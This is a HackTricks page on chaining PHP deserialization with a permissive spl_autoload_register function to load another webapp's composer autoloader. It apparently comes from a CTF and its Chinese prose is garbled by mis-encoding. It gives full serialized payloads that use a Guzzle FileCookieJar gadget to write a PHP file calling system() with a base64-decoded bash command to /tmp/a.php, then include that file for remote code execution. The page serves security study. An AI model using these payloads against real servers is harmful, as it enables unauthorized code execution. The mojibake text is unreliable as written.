# PHP - ååºåˆ—åŒ– + è‡ªåŠ¨åŠ è½½ç±»

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

é¦–å…ˆï¼Œæ‚¨åº”è¯¥æ£€æŸ¥ä»€ä¹ˆæ˜¯ [**è‡ªåŠ¨åŠ è½½ç±»**](https://www.php.net/manual/en/language.oop5.autoload.php)ã€‚

## PHP ååºåˆ—åŒ– + spl\_autoload\_register + LFI/å°å·¥å…·

æˆ‘ä»¬å¤„äºä¸€ç§æƒ…å†µï¼Œå‘ç°äº†ä¸€ä¸ª **webapp ä¸­çš„ PHP ååºåˆ—åŒ–**ï¼Œå¹¶ä¸” **æ²¡æœ‰** åº“åœ¨ **`phpggc`** ä¸­æ˜“å—å°å·¥å…·æ”»å‡»ã€‚ç„¶è€Œï¼Œåœ¨åŒä¸€ä¸ªå®¹å™¨ä¸­æœ‰ä¸€ä¸ª **ä¸åŒçš„ composer webappï¼Œå…·æœ‰æ˜“å—æ”»å‡»çš„åº“**ã€‚å› æ­¤ï¼Œç›®æ ‡æ˜¯ **åŠ è½½å¦ä¸€ä¸ª webapp çš„ composer åŠ è½½å™¨**ï¼Œå¹¶åˆ©ç”¨å®ƒ **åŠ è½½ä¸€ä¸ªå°†åˆ©ç”¨è¯¥åº“çš„å°å·¥å…·**ï¼Œè¯¥å°å·¥å…·æ¥è‡ªæ˜“å—ååºåˆ—åŒ–æ”»å‡»çš„ webappã€‚

æ­¥éª¤ï¼š

* æ‚¨å‘ç°äº†ä¸€ä¸ª **ååºåˆ—åŒ–**ï¼Œå¹¶ä¸” **å½“å‰åº”ç”¨ä»£ç ä¸­æ²¡æœ‰ä»»ä½•å°å·¥å…·**
* æ‚¨å¯ä»¥åˆ©ç”¨ **`spl_autoload_register`** å‡½æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œ**åŠ è½½ä»»ä½•æœ¬åœ°æ–‡ä»¶ï¼Œæ‰©å±•åä¸º `.php`**
* ä¸ºæ­¤ï¼Œæ‚¨ä½¿ç”¨ä¸€ä¸ªååºåˆ—åŒ–ï¼Œå…¶ä¸­ç±»çš„åç§°å°†ä½äº **`$name`** ä¸­ã€‚æ‚¨ **ä¸èƒ½åœ¨åºåˆ—åŒ–å¯¹è±¡çš„ç±»åä¸­ä½¿ç”¨ "/" æˆ– "."**ï¼Œä½†æ˜¯ **ä»£ç ** æ­£åœ¨ **å°†ä¸‹åˆ’çº¿** ("\_") **æ›¿æ¢ä¸ºæ–œæ ** ("/")ã€‚å› æ­¤ï¼Œåƒ `tmp_passwd` è¿™æ ·çš„ç±»åå°†è¢«è½¬æ¢ä¸º `/tmp/passwd.php`ï¼Œä»£ç å°†å°è¯•åŠ è½½å®ƒã€‚\
ä¸€ä¸ª **å°å·¥å…·ç¤ºä¾‹** å°†æ˜¯ï¼š**`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
å¦‚æœä½ æœ‰ä¸€ä¸ª **æ–‡ä»¶ä¸Šä¼ ** å¹¶ä¸”å¯ä»¥ä¸Šä¼ ä¸€ä¸ª **`.php` æ‰©å±•å** çš„æ–‡ä»¶ï¼Œä½ å¯ä»¥ **ç›´æ¥åˆ©ç”¨è¿™ä¸ªåŠŸèƒ½** å¹¶è·å¾— RCEã€‚
{% endhint %}

åœ¨æˆ‘çš„æƒ…å†µä¸‹ï¼Œæˆ‘æ²¡æœ‰è¿™æ ·çš„ä¸œè¥¿ï¼Œä½†åœ¨ **åŒä¸€ä¸ªå®¹å™¨** å†…æœ‰å¦ä¸€ä¸ª composer ç½‘é¡µï¼Œé‡Œé¢æœ‰ä¸€ä¸ª **æ˜“å—æ”»å‡»çš„ `phpggc` å°å·¥å…·**ã€‚

* è¦åŠ è½½è¿™ä¸ªå…¶ä»–åº“ï¼Œé¦–å…ˆä½ éœ€è¦ **åŠ è½½é‚£ä¸ªå…¶ä»– web åº”ç”¨çš„ composer åŠ è½½å™¨**ï¼ˆå› ä¸ºå½“å‰åº”ç”¨çš„åŠ è½½å™¨æ— æ³•è®¿é—®å¦ä¸€ä¸ªçš„åº“ã€‚ï¼‰ **çŸ¥é“åº”ç”¨çš„è·¯å¾„**ï¼Œä½ å¯ä»¥å¾ˆå®¹æ˜“åœ°å®ç°è¿™ä¸€ç‚¹ï¼š**`O:28:"www_frontend_vendor_autoload":0:{}`**ï¼ˆåœ¨æˆ‘çš„æƒ…å†µä¸‹ï¼Œcomposer åŠ è½½å™¨åœ¨ `/www/frontend/vendor/autoload.php`ï¼‰
* ç°åœ¨ï¼Œä½ å¯ä»¥ **åŠ è½½** å…¶ä»– **åº”ç”¨çš„ composer åŠ è½½å™¨**ï¼Œæ‰€ä»¥æ˜¯æ—¶å€™ **`ç”Ÿæˆ phpgcc`** **æœ‰æ•ˆè½½è·** æ¥ä½¿ç”¨ã€‚åœ¨æˆ‘çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä½¿ç”¨äº† **`Guzzle/FW1`**ï¼Œè¿™è®©æˆ‘å¯ä»¥ **åœ¨æ–‡ä»¶ç³»ç»Ÿå†…å†™å…¥ä»»ä½•æ–‡ä»¶**ã€‚
* æ³¨æ„ï¼š**ç”Ÿæˆçš„å°å·¥å…·æ²¡æœ‰å·¥ä½œ**ï¼Œä¸ºäº†ä½¿å…¶å·¥ä½œï¼Œæˆ‘ **ä¿®æ”¹** äº†é‚£ä¸ªæœ‰æ•ˆè½½è· **`chain.php`** çš„ phpggcï¼Œå¹¶å°† **æ‰€æœ‰å±æ€§** çš„ç±» **ä»ç§æœ‰æ”¹ä¸ºå…¬å…±**ã€‚å¦‚æœä¸è¿™æ ·åšï¼Œååºåˆ—åŒ–å­—ç¬¦ä¸²åï¼Œåˆ›å»ºçš„å¯¹è±¡çš„å±æ€§å°†æ²¡æœ‰ä»»ä½•å€¼ã€‚
* ç°åœ¨æˆ‘ä»¬æœ‰åŠæ³• **åŠ è½½å…¶ä»–åº”ç”¨çš„ composer åŠ è½½å™¨** å¹¶ä¸”æœ‰ä¸€ä¸ª **æœ‰æ•ˆçš„ phpggc æœ‰æ•ˆè½½è·**ï¼Œä½†æˆ‘ä»¬éœ€è¦ **åœ¨åŒä¸€ä¸ªè¯·æ±‚ä¸­æ‰§è¡Œæ­¤æ“ä½œï¼Œä»¥ä¾¿åœ¨ä½¿ç”¨å°å·¥å…·æ—¶åŠ è½½åŠ è½½å™¨**ã€‚ä¸ºæ­¤ï¼Œæˆ‘å‘é€äº†ä¸€ä¸ªåºåˆ—åŒ–æ•°ç»„ï¼ŒåŒ…å«ä¸¤ä¸ªå¯¹è±¡ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
* ä½ å¯ä»¥çœ‹åˆ° **é¦–å…ˆåŠ è½½åŠ è½½å™¨ï¼Œç„¶åæ˜¯æœ‰æ•ˆè½½è·**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥**åˆ›å»ºå’Œå†™å…¥æ–‡ä»¶**ï¼Œä½†æ˜¯ç”¨æˆ·**æ— æ³•åœ¨webæœåŠ¡å™¨çš„ä»»ä½•æ–‡ä»¶å¤¹ä¸­å†™å…¥**ã€‚å› æ­¤ï¼Œå¦‚æ‚¨åœ¨æœ‰æ•ˆè´Ÿè½½ä¸­æ‰€è§ï¼ŒPHPè°ƒç”¨**`system`**å¹¶åœ¨**`/tmp/a.php`**ä¸­åˆ›å»ºäº†ä¸€äº›**base64**ã€‚ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥**é‡ç”¨æˆ‘ä»¬ç”¨äºLFIçš„ç¬¬ä¸€ç§æœ‰æ•ˆè´Ÿè½½**æ¥åŠ è½½å¦ä¸€ä¸ªwebåº”ç”¨ç¨‹åºçš„composeråŠ è½½å™¨**ä»¥åŠ è½½ç”Ÿæˆçš„`/tmp/a.php`**æ–‡ä»¶ã€‚åªéœ€å°†å…¶æ·»åŠ åˆ°ååºåˆ—åŒ–å°å·¥å…·ä¸­ï¼š&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**æœ‰æ•ˆè½½è·æ‘˜è¦**

* **åŠ è½½åŒä¸€å®¹å™¨ä¸­ä¸åŒwebappçš„composerè‡ªåŠ¨åŠ è½½**
* **åŠ è½½phpggcå°å·¥å…·**ä»¥åˆ©ç”¨å…¶ä»–webappçš„åº“ï¼ˆæœ€åˆæ˜“å—ååºåˆ—åŒ–æ”»å‡»çš„webappçš„åº“ä¸­æ²¡æœ‰ä»»ä½•å°å·¥å…·ï¼‰
* å°å·¥å…·å°†**åœ¨/tmp/a.phpä¸­åˆ›å»ºä¸€ä¸ªåŒ…å«PHPæœ‰æ•ˆè½½è·**çš„æ–‡ä»¶ï¼Œé‡Œé¢æœ‰æ¶æ„å‘½ä»¤ï¼ˆwebappç”¨æˆ·æ— æ³•åœ¨ä»»ä½•webappçš„ä»»ä½•æ–‡ä»¶å¤¹ä¸­å†™å…¥ï¼‰
* æˆ‘ä»¬æœ‰æ•ˆè½½è·çš„æœ€åéƒ¨åˆ†å°†ä½¿ç”¨**åŠ è½½ç”Ÿæˆçš„phpæ–‡ä»¶**æ¥æ‰§è¡Œå‘½ä»¤

æˆ‘éœ€è¦**è°ƒç”¨è¿™ä¸ªååºåˆ—åŒ–ä¸¤æ¬¡**ã€‚åœ¨æˆ‘çš„æµ‹è¯•ä¸­ï¼Œç¬¬ä¸€æ¬¡åˆ›å»ºäº†`/tmp/a.php`æ–‡ä»¶ä½†æ²¡æœ‰åŠ è½½ï¼Œç¬¬äºŒæ¬¡åˆ™æ­£ç¡®åŠ è½½ã€‚

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
